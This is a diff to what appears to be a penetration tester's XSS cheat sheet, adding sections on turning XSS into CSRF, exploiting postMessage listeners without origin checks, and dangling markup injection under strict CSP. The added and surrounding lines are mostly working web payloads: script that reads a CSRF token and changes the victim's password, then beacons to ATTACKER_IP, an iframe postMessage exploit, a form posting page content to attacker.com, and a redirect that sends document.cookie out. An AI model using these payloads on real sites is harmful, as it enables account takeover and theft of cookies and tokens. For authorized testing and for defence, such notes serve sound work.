@@ -302,6 +302,29 @@ jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</
 '"><img src=x onerror=alert(1)>
 ```
 
+### XSS → CSRF (Perform Actions as Victim)
+
+XSS bypasses CSRF protections because the attacker's JS runs in the victim's browser origin, has access to CSRF tokens in the DOM, and sends requests with the victim's cookies automatically.
+
+```javascript
+// 1. Read CSRF token from meta tag or form
+var token = document.querySelector('meta[name="csrf-token"]').getAttribute('content');
+// or: document.querySelector('input[name="_token"]').value
+
+// 2. Submit state-changing request with victim's session + CSRF token
+fetch('/api/account/change-password', {
+  method: 'POST',
+  credentials: 'include',
+  headers: {
+    'Content-Type': 'application/json',
+    'X-CSRF-Token': token
+  },
+  body: JSON.stringify({new_password: 'attacker123'})
+}).then(r => new Image().src = 'http://ATTACKER_IP/?done=' + r.status);
+```
+
+> [!tip] This defeats CSRF defenses completely — the token is valid, the cookie is present, the origin is correct. Document this as "CSRF Bypass via XSS" in findings.
+
 ### Bypassing HttpOnly Cookies
 
 When cookies have `HttpOnly` flag (can't access via `document.cookie`):
@@ -507,6 +530,32 @@ $('#output').html(userInput);
 $.getJSON('/api?callback=' + userInput);
 ```
 
+### postMessage Exploitation
+
+When a page has a `message` event listener without an `origin` check, send a payload from an attacker-controlled page.
+
+**Vulnerable code pattern:**
+
+```javascript
+// No origin check — attacker can send arbitrary data
+window.addEventListener("message", function(e) {
+    document.getElementById("output").innerHTML = e.data;  // sink
+});
+```
+
+**Attacker page exploit:**
+
+```html
+<iframe src="http://target.com/page" id="frame"></iframe>
+<script>
+  document.getElementById("frame").onload = function() {
+    this.contentWindow.postMessage("<img src=x onerror=alert(document.domain)>", "*");
+  };
+</script>
+```
+
+> [!tip] Detection: search JS files for `addEventListener("message"` and check if `e.origin` is validated before the data is used.
+
 ### DOM Invader (Burp)
 
 Built into Burp's embedded browser. Automatically:
@@ -550,12 +599,30 @@ Content-Security-Policy: default-src 'self'; script-src 'self'
 <script nonce="leaked_nonce">alert(1)</script>
 ```
 
+### Dangling Markup Injection
+
+When CSP blocks script execution entirely but doesn't restrict form actions, an unclosed tag exfiltrates subsequent page content (CSRF tokens, secrets) to an attacker-controlled server.
+
+```html
+<!-- Inject an unclosed form tag — subsequent HTML including hidden fields submits to attacker -->
+<form action="//attacker.com">
+
+<!-- Any hidden inputs that follow (CSRF token, user data) are captured when the form submits -->
+```
+
+**Useful when:**
+- Script tags are blocked by CSP
+- The page has hidden fields containing tokens/secrets rendered after the injection point
+- `form-action` CSP directive is not set (defaults to `default-src` which is often `'self'` only)
+
+> [!note] This bypasses CSRF token theft since the victim's browser submits the form to you, not the legitimate server.
+
 ### When CSP Blocks Everything
 
 Even with strict CSP, XSS can still:
 - Redirect: `document.location = 'http://ATTACKER_IP/?cookie=' + document.cookie`
 - Exfiltrate via CSS injection (if style-src is permissive)
-- Abuse dangling markup injection
+- Use dangling markup injection to exfil tokens without script execution
 
 ---
 
@@ -759,5 +826,5 @@ Understanding defenses helps you spot gaps:
 ---
 
 *Created: 2026-02-27*
-*Updated: 2026-05-13*
+*Updated: 2026-05-14*
 *Model: claude-sonnet-4-6*
